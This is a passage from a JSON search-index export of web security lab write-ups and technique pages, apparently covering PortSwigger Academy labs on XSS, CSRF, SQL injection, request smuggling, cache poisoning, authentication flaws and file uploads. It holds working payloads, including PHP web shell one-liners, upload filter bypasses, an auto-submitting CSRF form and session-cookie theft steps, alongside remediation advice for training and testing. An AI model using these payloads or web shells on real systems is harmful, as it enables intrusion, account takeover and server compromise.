    "c": "Client-side prototype pollution via flawed sanitisation  Description  This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed. Reproduction and proof of concept  Find a prototype pollution source  In your browser, try polluting the Object.prototype by injecting an arbitrary property via the query string: /?__proto__.foo=bar Open the browser DevTools panel and go to the Console tab. Enter Object.prototype . Study the properties of the returned object and observe that the injected foo property has not been added. Try alternative prototype pollution vectors. For example: /?__proto__[foo]=bar /?constructor.prototype.foo=bar Observe in each instance the Object.prototype is not modified. Go to the Sources tab and study the JavaScript files that are loaded by the target site. var deparam = function( params, coerce ) { var obj = {}, coerce_types = { 'true': !0, 'false': !1, 'null': null }; if (!params) { return obj; } params.replace(/\\+/g, ' ').split('&').forEach(function(v){ var param = v.split( '=' ), key = decodeURIComponent( param[0] ), val, cur = obj, i = 0, keys = key.split( '][' ), keys_last = keys.length - 1; if ( /\\[/.test( keys[0] ) && /\\]$/.test( keys[ keys_last ] ) ) { keys[ keys_last ] = keys[ keys_last ].replace( /\\]$/, '' ); keys = keys.shift().split('[').concat( keys ); keys_last = keys.length - 1; } else { keys_last = 0; } if ( param.length === 2 ) { val = decodeURIComponent( param[1] ); if ( coerce ) { val = val && !isNaN(val) && ((+val + '') === val) ? +val // number : val === 'undefined' ? undefined // undefined : coerce_types[val] !== undefined ? coerce_types[val] // true, false, null : val; // string } if ( keys_last ) { for ( ; i <= keys_last; i++ ) { key = keys[i] === '' ? cur.length : keys[i]; cur = cur[sanitizeKey(key)] = i < keys_last ? cur[sanitizeKey(key)] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] ) : val; } } else { if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) { obj[sanitizeKey(key)].push( val ); } else if ( {}.hasOwnProperty.call(obj, key) ) { obj[sanitizeKey(key)] = [ obj[key], val ]; } else { obj[sanitizeKey(key)] = val; } } } else if ( key ) { obj[key] = coerce ? undefined : ''; } }); return obj; }; function sanitizeKey(key) { let badProperties = ['constructor','__proto__','prototype']; for(let badProperty of badProperties) { key = key.replaceAll(badProperty, ''); } return key; } deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitisation process. For example: /?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar /?constconstructorructor.[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar. You’ve successfully found a prototype pollution source and bypassed the website’s key sanitisation. Identify a gadget  Study the JavaScript files again: async function searchLogger() { let config = {params: deparam(new URL(location).searchParams.toString())}; if(config.transport_url) { let script = document.createElement('script'); script.src = config.transport_url; document.body.appendChild(script); } if(config.params && config.params.search) { await logQuery('/logger', config.params); } } searchLogger.js dynamically appends a script to the DOM using the config object’s transport_url property if present. Notice that no transport_url property is set for the config object. This is a potential gadget. Craft an exploit  Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property: /?__pro__proto__to__[transport_url]=foo In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. <script src=\"foo\"></script> A script element has been rendered on the page, with the src attribute foo . Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL : /?__pro__proto__to__[transport_url]=data:,alert(1); Observe that the alert(1) is called and the lab is solved. Exploitability  An attacker will need to find a source that you can use to add arbitrary properties to the global Object.prototype ; identify a gadget property that allows you to execute arbitrary JavaScript; and combine these to call alert() .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "79f59e6c5999c2b21f750c9329883d00",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Directory traversal Labs Introduction  What?  Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. Why?  In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behaviour, and ultimately take full control of the server. How?  Directory traversal File path traversal, simple case File path traversal, traversal sequences blocked with absolute path bypass File path traversal, traversal sequences stripped non-recursively File path traversal, traversal sequences stripped with superfluous URL-decode File path traversal, validation of start of path File path traversal, validation of file extension with null byte bypass",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106f3289b324855b00dd9b74accc71a9",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/1",
    "t": "CSRF vulnerability with no defenses ",
    "c": "CSRF vulnerability with no defenses  Description  This lab ’s email change functionality is vulnerable to CSRF. Reproduction and proof of concept  Log in and intercept updating email (which is vulnerable): To create the exploit, put the correct parameters in the template given in Cross-site request forgery (CSRF) : <html> <body> <form action=\"https://0abe00ae04c3c7a8c1a5356100cc00d2.web-security-academy.net/my-account/change-email\" method=\"POST\"> <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /> </form> <script> document.forms[0].submit(); </script> </body> </html> Paste the exploit in the body field of the exploit server form (link to exploit server is up top): To verify that the exploit works, try it by clicking View exploit , turning intercept on again, and checking the resulting HTTP request and response. Click Deliver to victim to solve the lab. Exploitability  An attacker needs to craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to the exploit server. An account with credentials wiener:peter is available.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aec61afd8036d5dd4861062d6b786328",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/7",
    "t": "SQL injection attack, querying the database type and version on Oracle ",
    "c": "SQL injection attack, querying the database type and version on Oracle  Description  This lab contains an SQL injection vulnerability in the product category filter. It is possible to use a UNION attack to retrieve the results from an injected query. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'+FROM+dual-- Use the following payload to display the database version: '+UNION+SELECT+BANNER,+NULL+FROM+v$version-- Exploitability  An attacker will need to display the database version string.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8661bc1a9d988b0eef4ba131d30378a1",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy OAuth authentication Labs Introduction  What?  The basic OAuth process is widely used to integrate third-party functionality that requires access to certain data from a user’s account. For example, an application might use OAuth to request access to your email contacts list so that it can suggest people to connect with. However, the same mechanism is also used to provide third-party authentication services, allowing users to log in with an account that they have with a different website. Why?  OAuth 2.0 is popular with attackers because it is both extremely common and inherently prone to implementation mistakes. This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authentication completely. How?  Single-sign-on security issues (SSO) Authentication bypass via OAuth implicit flow Forced OAuth profile linking OAuth account hijacking via redirect_uri Stealing OAuth access tokens via an open redirect SSRF via OpenID dynamic client registration Stealing OAuth access tokens via a proxy page",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9618005cad099c8a390a0aa0df4a9482",
    "u": "https://webapp.tymyrddin.dev/docs/headers/1",
    "t": "Basic password reset poisoning ",
    "c": "Basic password reset poisoning  Description  This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. Reproduction  Go to the login page and notice the Forgot your password? functionality. Request a password reset for your own account. Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. The URL contains the query parameter temp-forgot-password-token . Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want. In Burp, study the HTTP history. Notice that the POST /forgot-password request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater. In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you’ve received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name. Back in Burp Repeater, change the Host header to your exploit server’s domain name ( your-exploit-server-id.web-security-academy.net ) and change the username parameter to carlos . Send the request. Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing Carlos’s password reset token. Make a note of this token. Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in your browser, but replace your reset token with the one you obtained from the access log. Change Carlos’s password to whatever you want, then log in as carlos to solve the lab. PoC  Exploitability  An attacker will need to log in; exploit the vulnerability and then log in to Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bcfe1db125d22e73ce16a7ef0aa7fd0e",
    "u": "https://webapp.tymyrddin.dev/docs/cache/7",
    "t": "Parameter cloaking ",
    "c": "Parameter cloaking  Description  This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site’s home page using Chrome. Reproduction and proof of concept  Identify that the utm_content parameter is supported. Observe that it is also excluded from the cache key. Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select “Bulk scan” > “Rails parameter cloaking scan” to identify the vulnerability automatically. Observe that every page imports the script /js/geolocate.js , executing the callback function setCountryCookie() . Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater. Notice that you can control the name of the function that is called on the returned data by editing the callback parameter. However, you can’t poison the cache for other users in this way because the parameter is keyed. Study the cache behaviour. Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response: Send the request again, but this time pass in alert(1) as the callback function: GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) Get the response cached, then load the home page in your browser. Check that the alert() is triggered. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL. Exploitability  An attacker will need to use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c4e7521882cde17d5159556888861280",
    "u": "https://webapp.tymyrddin.dev/docs/xss/4",
    "t": "DOM XSS in innerHTML sink using source location.search ",
    "c": "DOM XSS in innerHTML sink using source location.search  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search . Reproduction and proof of concept  If there is a query in the location.search variable (the URL input), document.getElementById gets the element with ID searchMessage . Then it will set its innerHTML to the query. Enter into the search box: <img src=x onerror=alert(1)> During the rendering of the page, the image fails to load. This will raise the JavaScript alert box, confirming the XSS vulnerability.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1c3d2ef00c4faf511f461f17cf53592b",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/auth",
    "t": "Authentication vulnerabilities ",
    "c": "Authentication vulnerabilities  The majority of threats related to the authentication process are associated with passwords and password-based authentication methods. But broken authentication also causes a significant amount of vulnerabilities. Broken authentication occurs when the implementation of the authentication process is flawed. This is usually hard to discover, and can be more severe than the risks associated with passwords. Steps  For finding the most common authentication-based vulnerabilities, check: Username enumeration. Weak credentials. Try a brute-force attack. HTTP basic authentication. Poor session management. Staying logged in. SQLi. Insecure password change and recovery. Flawed two-factor authentication. Vulnerable authentication logic. Human negligence. Username enumeration  Username enumeration is not exactly an authentication vulnerability. But, it can make life easier by lowering the cost for other attacks, such as brute-force attacks or weak credential checks. Weak credential check  Try common credentials like admin, admin1, and password1, and passwords typical for the organisation under investigation. With no restrictions on weak passwords, even sites protected against brute-force attacks can find themselves compromised. Brute force attack  If there is a flawed brute-force protection system such as a flaw in the authentication logic, firewall, or secure shell (SSH) protocol, you can hijack login credentials and processes. HTTP basic authentication  HTTP basic authentication is simple, sending a username and password with each request. And if security protocols such as TLS session encryption are not used for all communication, the username and password information can be sent in the clear, making it easy to steal the credentials. The included credentials contain little context, and can easily be misused in attacks such as cross-site request forgeries (CSRF). And because they are included with every single request, modern browsers normally cache this information indefinitely, with minimal ability to “log out”, making it easy to reuse the credentials. Session management  There are several session mismanagement vulnerabilities such as no session timeouts, exposure of session IDs in URLs, session cookies without the Http-Only flag set, and poor session invalidation. Seizing control of an existing session, it is possible to get into a system by assuming the identity of an already-authenticated user, bypassing the authentication process entirely. Staying logged in  A Remember me or Keep me logged in checkbox beneath a login form makes it super easy for users to stay logged in after closing a session. It generates a cookie that lets users skip the process of logging in. And this can lead to a cookie-based authentication vulnerability if it is possible to predict a cookie or deduce its generation pattern. This opens the door to malicious techniques like brute-force attacks to predict cookies, and cross-site scripting (XSS) to hack user accounts by allowing a malicious server to make use of a legitimate cookie. If a cookie is poorly designed or protected, it may be possible to obtain passwords or other sensitive (and legally protected) data such as user addresses or account information from a stored cookie. SQL injection  SQL injections can enable attacks on authentication mechanisms by stealing relevant data (such as poorly protected password hashes) from an unprotected database. They can also bypass authentication mechanisms if the injected SQL code is executed by an internal (and already authorised) tool that failed to sufficiently validate external input. Insecure password change and recovery  The password reset process poses an authentication vulnerability if an application uses a weak password recovery mechanism such as easy security questions, no CAPTCHAs, or password reset e-mails with overly long or no timeouts. If the password recovery functionality is flawed, it may be possible to use brute-force techniques or access to other compromised accounts to gain access to user accounts and credentials that are well-protected under normal circumstances. Flawed two-factor authentication  While two-factor authentication (2FA) is effective for secure authentication, it can cause critical security issues if not well-implemented. Attackers can figure out the four- and six-digit 2FA verification codes through SIM swap attacks if they are sent through SMS. Some two-factor authentication is also not truly two-factor; if a user is attempting to access sensitive information on a stolen phone using cached credentials, a “second factor” that sends a message to that same phone adds no additional security. Two-factor authentication vulnerabilities can also occur if there’s no brute-force protection to lockout an account after a specific number of attempted logins. Vulnerable authentication logic  Logic vulnerabilities are common in software applications as a result of poor coding or design that affects authentication and authorisation access, and application functionality. Human negligence  Sorry, this list is too long, and not very useful in a pentesting or bug hunting setting. In red teaming however … :) Escalation  Authentication vulnerabilities have serious impact because they can be used to: Steal sensitive information Masquerade as a legitimate user Gain control of the application Gain further access Destroy the system Portswigger lab writeups  Username enumeration via different responses 2FA simple bypass Password reset broken logic Username enumeration via subtly different responses Username enumeration via response timing Broken brute-force protection, IP block Username enumeration via account lock 2FA broken logic Brute-forcing a stay-logged-in cookie Offline password cracking Password reset poisoning via middleware Password brute-force via password change Broken brute-force protection, multiple credentials per request 2FA bypass using a brute-force attack Remediation  Use monitoring and IDS/IPS systems. Apply HSTS to force web sessions to use TLS encryption, preventing sensitive information from being accessed in transit. By generating the same error for a login failure whether the username was valid or invalid, you force an attacker to brute-force not just the set of possible passwords, but also the set of likely usernames, rather than sticking to the ones they know are valid. HttpOnly and SameSite tags protect cookie headers from XSS and CSRF attacks, respectively. Review code to check all verifications are in place. Audit code regularly to discover logic flaws and authentication bypasses and strengthen your security posture. MFA protects applications by using a second source of validation before granting access to users. Standard authentication methods, including MFA, ask users for specific credentials whenever they try to log in or access corporate resources. Adaptive Authentication asks for different credentials, depending upon the situation — tightening security when the risk of breach is higher. Resources  Portswigger: How to secure your authentication mechanisms",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7cd8168a3c2386b7a236f7ca4d6c4af1",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/shells",
    "t": "File uploads ",
    "c": "File uploads  File upload functions can be used as a powerful vector for a number of high-severity attacks. Steps  Browse the site and find each upload functionality. Start with basic test by uploading a webshell using Weevely. If that fails, try the bypasses. If a bypass is successful, exploit further, or try another. Make report. Blacklisting bypass  Find the upload request, send it to Repeater and test which extension for the file is blacklisted by changing the filename= parameter: POST /images/upload/ HTTP/1.1 Host: target.com ... Content-Disposition: form-data; name=\"uploaded\"; filename=\"wut.php\" Content-Type: application/x-php Extension Try PHP .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc ASP asp, .aspx, .cer, .asa Jsp .jsp, .jspx, .jsw, .jsv, .jspf Coldfusion .cfm, .cfml, .cfc, .dbm Using random capitalization .pHp, .pHP5, .PhAr Find more in PayloadAllThings. If successful, exploit further, or try another type of validation or bypass. Whitelisting bypass  Try these extensions on the filename= parameter: file.jpg.php file.php.jpg file.php.blah123jpg file.php%00.jpg file.php\\x00.jpg file.php%00 file.php%20 file.php%0d%0a.jpg file.php..... file.php/ file.php.\\ file.php#.png file. .html Content-Type validation  Change the Content-Type: application/x-php or Content-Type : application/octet-stream to Content-Type: image/png or Content-Type: image/gif or Content-Type: image/jpg . Content-Length validation  For Content-Type: application/x-php , try a small file payload: <?=`$_GET[x]`?> <?=‘ls’; Note : <? work for “short_open_tag=On” in php.ini ( Default=On ) If that works, try a better shell … Magic bytes  Change Content-Type: application/x-php to Content-Type: image/gif and add the text GIF89a; before the shell-code. POST /images/upload/ HTTP/1.1 Host: target.com ... Content-Disposition: form-data; name=\"uploaded\"; filename=\"wut.php\" Content-Type: image/gif GIF89a; <?php system($_GET['cmd']); ?> See List of file signatures . Magic bytes and metadata shell  Bypass Content-Type checks by setting the value of the Content-Type header to image/png , text/plain , application/octet-stream , and create a shell using the metadata using tool exiftool: exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg Try uploading the modified img.jpg . Uploading configuration files  Try, for example, uploading a .htaccess file htshells or a .config file. Code can be appended at the end of the file. For example, uploading a .htaccess file with AddType application/x-httpd-php .l33t , instructs the Apache HTTP Server to execute PNG images as though they were PHP scripts. After that, upload a php webshell file with extension .l33t . Zip slip  If a site accepts .zip files, upload .php by compressing it into .zip and uploading it. Then visit target.com/path?page=zip://path/file.zip%23rce.php . Escalation  The impact of file upload vulnerabilities generally depends on two key factors: Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on. What restrictions are imposed on the file once it has been successfully uploaded. What can you achieve by exploiting file-upload: Remote code execution, SSRF, XSS, LFI, XXE, phishing, parameter pollution, disclosure of internal paths, SQL injection, DoS attack, etcetera: Extension(s) Impact ASP, ASPX, PHP5, PHP, PHP3 Webshell, RCE SVG Stored XSS, SSRF, XXE GIF Stored XSS, SSRF CSV CSV injection XML XXE AVI LFI, SSRF HTML, JS HTML injection, XSS, Open redirect PNG, JPEG Pixel flood attack (DoS) ZIP RCE via LFI, DoS PDF, PPTX SSRF, BLIND XXE SCF RCE In the worst case scenario, the file’s type isn’t validated properly, and the server configuration allows certain types of file (such as .php and .jsp ) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a webshell, effectively granting them full control over the server. Portswigger labs  Remote code execution via web shell upload Web shell upload via Content-Type restriction bypass Web shell upload via path traversal Web shell upload via extension blacklist bypass Web shell upload via obfuscated file extension Remote code execution via polyglot web shell upload Web shell upload via race condition Race conditions Remediation  Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It’s much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload. Make sure the filename doesn’t contain any substrings that may be interpreted as a directory or a traversal sequence ( ../ ). Rename uploaded files to avoid collisions that may cause existing files to be overwritten. Do not upload files to the server’s permanent filesystem until they have been fully validated. If uploaded files are downloadable by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment. Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration). Reject attempts to upload archive formats such as ZIP. As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms. Resources  Portswigger: File upload vulnerabilities OWASP:Test Upload of Malicious Files OWASP: File Upload Cheat Sheet Weevely",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6a4b15b84de9e91d8df48f56a8fa0a51",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/smuggling",
    "t": "HTTP Request smuggling ",
    "c": "HTTP Request smuggling  HTTP request smuggling vulnerabilities occur when the frontend and the backend interpret the boundary of an HTTP request differently causing de-synchronisation between them. This is due to numerous frontend and backend libraries deviating from RFC specifications when dealing with both the Content-Length and the Transfer-Encoding header. HTTP request bodies can be framed according to these two headers and deviations from the specification occur. As a result, part of a request gets appended or smuggled, to the next one which allows the response of the smuggled request to be provided to another user. The body can vary from application to application, framework to framework, and the Content-Length and Transfer-Encoding: chunked headers are applicable to HTTP/1.1 and partially to HTTP/1.0 , but not to HTTP/2 . That written, other forms of smuggling are possible with the latter. HTTP 1.1 allows for sending both Content-Length ( CL ) and Transfer-Encoding ( TE ) headers in the same request, but when both are sent, TE takes precedence. A Parent Smuggled Request is a request that has both the headers to trick the servers. A Child Smuggled Request is an ideal request hidden inside the parent-smuggled request. It is called ideal because it only has one of the headers. Steps  Send malformed requests to check for: CL:CL : When provided with two Content-Length headers, if implementation differences occur between a frontend and a backend on which Content-Length header is prioritised, smuggling attacks can occur. CL:TE : Different HTTP libraries tolerate different variations of the Transfer-Encoding header and will normalise them to improve client experience. By understanding what variations of the TE header is normalised by the backend server, it might be possible to smuggle a malformed TE header through the frontend and conduct a CL:TE smuggling attack. The first part of a request declares a short chunk length, typically 0 . The frontend server reads only the first part of the request and passes the second part to the back-end server. TE:TE : Frontend and backend servers correctly prioritise the Transfer-Encoding header, but the header can be obfuscated to trick one of the servers. TE:CL : The frontend server prioritises the Transfer-Encoding weakness, while the backend server prioritises the Content-Length weakness, making it possible to declare the length of the first chunk up to and including the malicious request. The second chunk is declared as having 0 length, so the frontend server assumes the request is complete. It passes the request to the backend server, which receives and processes it. Escalation  Gain access to protected resources, such as admin consoles Gain access to sensitive data Hijack sessions of web users Launch cross-site scripting (XSS) attacks without requiring any action from the user Credential hijacking Portswigger lab writeups  HTTP request smuggling, basic CL.TE vulnerability HTTP request smuggling, basic TE.CL vulnerability HTTP request smuggling, obfuscating the TE header HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP request smuggling, confirming a TE.CL vulnerability via differential responses Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability Exploiting HTTP request smuggling to reveal front-end request rewriting Exploiting HTTP request smuggling to capture other users’ requests Exploiting HTTP request smuggling to deliver reflected XSS Response queue poisoning via H2.TE request smuggling H2.CL request smuggling HTTP/2 request smuggling via CRLF injection HTTP/2 request splitting via CRLF injection CL.0 request smuggling Exploiting HTTP request smuggling to perform web cache poisoning Exploiting HTTP request smuggling to perform web cache deception Bypassing access controls via HTTP/2 request tunnelling Web cache poisoning via HTTP/2 request tunnelling Client-side desync Browser cache poisoning via client-side desync Server-side pause-based request smuggling Remediation  The responsibility of remediation falls onto a backend maintainer as much as a frontend maintainer. One can argue that normalising malformed headers should be acceptable behaviour from a backend and make it more tolerant to user faults, and that the real problem is proxies which forward these requests without normalising them first. But due to the vast ecosystem of dependencies and numerous libraries fitting the criteria of a backend and frontend, both parties are to try and remediate these issues. Interpret HTTP headers consistently on front-end and back-end servers. This is not always an option, as load balancers are generally hardware appliances that support backend servers, which are run on distinct platforms. If you cannot run the same software on both front-end and back-end, at least be aware of how each server deals with HTTP headers, and ensure they consistently interpret HTTP requests. If possible, disable connection reuse on the backend server. This can completely prevent HTTP request smuggling. Disable vulnerable optimisations: If it is not possible to change backend configurations, disable any performance optimisations that use the Transfer-Encoding or Content-Length header. If possible, avoid the use of load balancers, content delivery networks (CDNs), or reverse proxies. Use HTTP/2 , making sure that frontend and backend servers only communicate using the HTTP/2 protocol. This is still no guarantee. Prevent it being downgraded. Configure the frontend server to normalise ambiguous requests to prevent malicious requests being passed to the backend server. HTTP logs should only be available to administrative users, to avoid exposing unintended parts of an HTTP request to potential attackers. Use a web application firewall (WAF) which can identify and blocks or sanitise HTTP traffic. Check whether any changes to the WAF configuration are required to safeguard against an HTTP request smuggling vulnerability. Resources  Portswigger: HTTP request smuggling Snyk: Demystifying HTTP request smuggling OWASP: Testing for HTTP Splitting Smuggling",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d49f459859680ed5d637b561cbe431ea",
    "u": "https://webapp.tymyrddin.dev/docs/xss/23",
    "t": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped ",
    "c": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped  Description  The website in this lab contains a stored cross-site scripting vulnerability in the comment functionality. Reproduction and proof of concept  Post a comment with a random alphanumeric string in the “Website” input, then use Burp Suite to intercept the request and send it to Burp Repeater. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater. Note the random string in the second Repeater tab has been reflected inside an onclick event handler attribute. <p> <img src=\"/resources/images/avatarDefault.svg\" class=\"avatar\"> <a id=\"author\" href=\"http://whatever\" onclick=\"var tracker={track(){}};tracker.track('http://whatever');\">Oi</a> | 26 January 2023 </p> Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload: http://foo?&apos;-alert(1)-&apos; Verify the technique worked by right-clicking, selecting “Copy URL”, and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0b06f2d464808f3eb7006284d01527e5",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/13",
    "t": "HTTP/2 request smuggling via CRLF injection ",
    "c": "HTTP/2 request smuggling via CRLF injection  Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers. Reproduction and proof of concept  In Burp’s browser, use the lab’s search function a couple of times and observe that the website records your recent search history. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request. Notice that your search history is reset, confirming that it’s tied to your session cookie. Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2 . Using the Inspector, add an arbitrary header to the request. Append the sequence \\r\\n to the header’s value, followed by the Transfer-Encoding: chunked header: Name foo Value bar\\r\\n Transfer-Encoding: chunked In the body, attempt to smuggle an arbitrary prefix as follows: 0 SMUGGLED Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix. Change the body of the request to the following: Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive: If you got lucky with your timing, you may see a 404 Not Found response. In this case, refresh the page again and move on to the next step. If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the search=x parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before refreshing the page. If you see a 404 response , just refresh the page again. Check the recent searches list. If it contains a GET request, this is the start of the victim user’s request and includes their session cookie. If you instead see your own POST request, you refreshed the page too early. Try again until you have successfully stolen the victim’s session cookie. In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab. Exploitability  An attacker will need to use an HTTP/2 -exclusive request smuggling vector to gain access to another user’s account. The victim accesses the home page every 15 seconds.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "50e3daf73a2d31667572a1aa62c0b9eb",
    "u": "https://webapp.tymyrddin.dev/docs/business/11",
    "t": "Authentication bypass via encryption oracle ",
    "c": "Authentication bypass via encryption oracle  Description  This lab contains a logic flaw that exposes an encryption oracle to users. Reproduction and proof of concept  Log in with wiener:peter and the Stay logged in option enabled and post a comment. Study the corresponding requests and responses using Burp’s manual testing tools. Observe that the stay-logged-in cookie is encrypted. Submitting a comment using an invalid email address, the response sets an encrypted notification cookie before redirecting to the blog post. The error message reflects the input from the email parameter in cleartext: This must have been decrypted from the notification cookie. Send the POST /post/comment and the subsequent GET /post?postId=x request (containing the notification cookie) to Burp Repeater. In Repeater, it is possible to use the email parameter of the POST request to encrypt arbitrary data and reflect the corresponding ciphertext in the Set-Cookie header. Likewise, it is possible to use the notification cookie in the GET request to decrypt arbitrary ciphertext and reflect the output in the error message. For simplicity, double-click the tab for each request and rename the tabs encrypt and decrypt respectively. In the decrypt request, copy the stay-logged-in cookie and paste it into the notification cookie. Send the request. Instead of the error message, the response now contains the decrypted stay-logged-in cookie, for example: This reveals that the cookie should be in the format username:timestamp . Copy the timestamp to the clipboard. Go to the encrypt request and change the email parameter to administrator:timestamp . Send the request and then copy the new notification cookie from the response. Decrypt this new cookie and observe that the 23-character \"Invalid email address: \" prefix ( 23 bytes) is automatically added to any value passed in using the email parameter. Send the notification cookie to Burp Decoder. In Decoder, URL-decode and Base64-decode the cookie. In Burp Repeater, switch to the message editor’s Hex tab. Select the first 23 bytes, then right-click and select Delete selected bytes . Re-encode the data and copy the result into the notification cookie of the decrypt request. When sending the request, an error message indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16. Pad the \"Invalid email address: \" prefix with enough bytes so that the number of bytes you will remove is a multiple of 16. In Burp Repeater, go back to the encrypt request and add 9 characters ( 23 + 9 = 32 ) to the start of the intended cookie value, for example: Encrypt this input and use the decrypt request to test that it can be successfully decrypted. Send the new ciphertext to Decoder, then URL and Base64-decode it. This time, delete 32 bytes from the start of the data. Re-encode the data and paste it into the notification parameter in the decrypt request. Check the response to confirm that your input was successfully decrypted and, crucially, no longer contains the \"Invalid email address: \" prefix. You should only see administrator:your-timestamp . From the proxy history, send the GET / request to Burp Repeater. Delete the session cookie entirely, and replace the stay-logged-in cookie with the ciphertext of the self-made cookie. Send the request. You are now logged in as the administrator and have access to the admin panel. Using Burp Repeater, browse to /admin and notice the option for deleting users. Browse to /admin/delete?username=carlos to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; exploit the flaw to gain access to the admin panel and delete Carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e9dcee79eeab52108c3f22b342a9b89a",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/3",
    "t": "CSRF where token validation depends on token being present ",
